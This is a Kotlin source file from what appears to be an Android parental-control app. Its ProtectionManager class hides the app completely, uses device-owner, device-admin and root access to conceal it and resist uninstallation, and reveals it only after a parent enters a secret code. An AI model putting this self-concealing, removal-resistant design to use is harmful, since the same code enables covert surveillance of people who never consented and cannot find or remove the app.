package com.abo7tb.childapp.utils

import android.content.Context
import com.abo7tb.childapp.data.local.SecurePrefsManager
import dagger.hilt.android.qualifiers.ApplicationContext
import timber.log.Timber
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class ProtectionManager @Inject constructor(
    @ApplicationContext private val context: Context,
    private val stealthManager: StealthManager,
    private val securePrefsManager: SecurePrefsManager
) {

    data class ProtectionStatus(
        val deviceAdmin: Boolean,
        val deviceOwner: Boolean,
        val rootAvailable: Boolean,
        val rootHide: Boolean,
        val stealthLevel: StealthManager.StealthLevel
    )

    fun getStatus(): ProtectionStatus = ProtectionStatus(
        deviceAdmin = DeviceAdminHelper.isAdminActive(context),
        deviceOwner = DeviceOwnerHelper.hasStrongProtection(context),
        rootAvailable = RootHelper.isRootAvailable(),
        rootHide = RootHelper.isRootHideEnabled(context),
        stealthLevel = stealthManager.getCurrentLevel()
    )

    /** تطبيق أقصى حماية بعد التسجيل */
    fun applyFullProtection() {
        stealthManager.hideCompletely()

        if (DeviceOwnerHelper.hasStrongProtection(context)) {
            DeviceOwnerHelper.applyDeviceOwnerProtection(context)
        }

        if (RootHelper.isRootAvailable()) {
            RootHelper.hideApp(context)
        }

        securePrefsManager.putString("protection_applied_at", System.currentTimeMillis().toString())
        Timber.d("ProtectionManager: full protection applied — ${getStatus()}")
    }

    /** فتح التطبيق لولي الأمر (كود سري / verify) */
    fun revealForParentAccess() {
        if (DeviceOwnerHelper.hasStrongProtection(context)) {
            DeviceOwnerHelper.revealForParent(context)
        }
        if (RootHelper.isRootHideEnabled(context)) {
            RootHelper.unhideApp(context)
        }
        stealthManager.showForSetup()
        Timber.d("ProtectionManager: revealed for parent")
    }

    /** إخفاء بعد خروج ولي الأمر */
    fun hideAfterParentExit() {
        applyFullProtection()
        stealthManager.goHomeAndHide(400)
    }

    /** قبل حذف التطبيق — يتطلب verify parent مسبقاً */
    fun prepareForUninstallByParent() {
        if (DeviceOwnerHelper.hasStrongProtection(context)) {
            DeviceOwnerHelper.prepareUninstall(context)
        }
        if (RootHelper.isRootHideEnabled(context)) {
            RootHelper.unhideApp(context)
        }
        stealthManager.showForSetup()
        DeviceAdminHelper.deactivateAdmin(context)
        Timber.d("ProtectionManager: prepared for uninstall")
    }

    fun tryApplyRootHide(): Boolean {
        if (!RootHelper.isRootAvailable()) return false
        return RootHelper.hideApp(context)
    }
}
